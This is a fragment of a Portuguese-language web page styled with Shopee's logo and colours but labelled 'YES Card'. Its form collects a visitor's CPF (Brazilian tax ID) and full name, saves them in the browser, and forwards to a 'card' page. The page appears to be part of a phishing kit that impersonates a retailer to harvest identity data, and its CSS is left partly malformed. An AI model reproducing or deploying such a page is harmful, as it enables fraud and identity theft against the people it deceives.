        .header img {

        }

        .main-content {
            max-width: 500px;
            background: #fff;

            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }

        .btn-custom {
            color: white;
            border: none;
            width: 100%;
            margin-bottom: 10px;
            background: #ee4d2d;
            font-weight: 600;
            border-radius: 1rem;
            padding: .75rem 3rem;
            letter-spacing: .3px;
            line-height: 1.15;

        .btn-custom:hover {
            color: white !important;
            background-color: #000 !important;
            transform: scale(1.02) !important;
        }

        .footer {
            background: #ffffff;
            border-top: 1px solid #e6e6e6;
            text-align: center;
            padding: 15px;
            font-size: 10px;
            color: #666;
            margin-top: auto;
        }

        .result-box {
            margin-top: 20px;
            background-color: #f9f9f9;
            border: 1px solid #e6e6e6;
            border-radius: 8px;
            padding: 15px;
            display: none;
            text-align: left;
        }

        .result-box p {
            margin: 0 0 10px;
        }

        .loader {
            display: none;
            text-align: center;
            margin-bottom: 15px;
        }

        .loader img {
            width: 50px;
            height: 50px;
        }

        .success-message {
            text-align: center;
            font-weight: bold;
            color: green;
            margin-bottom: 15px;
        }

        .success-message img {
            width: 50px;
            height: 50px;
            display: block;
            margin: 0 auto 10px;
        }

    <!-- Header -->
    <div class="header">
        <img src="images/shopee-logo.png" alt="YES Card">
    </div>

<!-- Main Content -->
<div class="main-content">
    <p style="color:gray; text-align:initial">Preencha os dados abaixo</p>
    <form id="cadastroForm" style="text-align:initial">
        <div class="mb-3">
            <label for="cpf" class="form-label" style="color:gray; font-size:13px">CPF</label>
            <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00">
        </div>
        <div class="mb-3">
            <label for="nome" class="form-label" style="color:gray; font-size:13px">Nome Completo</label>
            <input type="text" class="form-control" id="nome" placeholder="Digite seu nome completo">
        </div>
    </form>
    <button id="salvarBtn" class="btn-custom" onclick="salvarDados()">Salvar e Continuar</button>
</div>

<!-- Script -->
<script>
    function salvarDados() {
        const cpf = document.getElementById("cpf").value;
        const nomeCompleto = document.getElementById("nome").value;

        if (!cpf || !nomeCompleto) {
            return;
        }

        localStorage.setItem("cpf", cpf);
        localStorage.setItem("nome", nomeCompleto);

        window.location.href = "../card.html" + window.location.search;
    }
</script>
